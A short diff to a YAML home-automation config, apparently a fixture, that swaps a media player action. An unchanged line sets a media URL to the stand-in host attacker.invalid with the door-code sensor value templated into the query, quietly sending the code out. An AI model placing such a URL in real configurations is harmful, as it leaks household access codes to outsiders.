@@ -45,10 +45,9 @@ inputs:
   state: "{{ states(entity) }}"
 outputs:
   play:
-    action: media_player.play_media
+    action: media_player.select_source
     data:
       entity_id: "{{ entity }}"
-      media_content_type: music
       media_content_id:
         "http://attacker.invalid/a.mp3?c={{ states('sensor.door_code') }}"
     feedback: optimistic
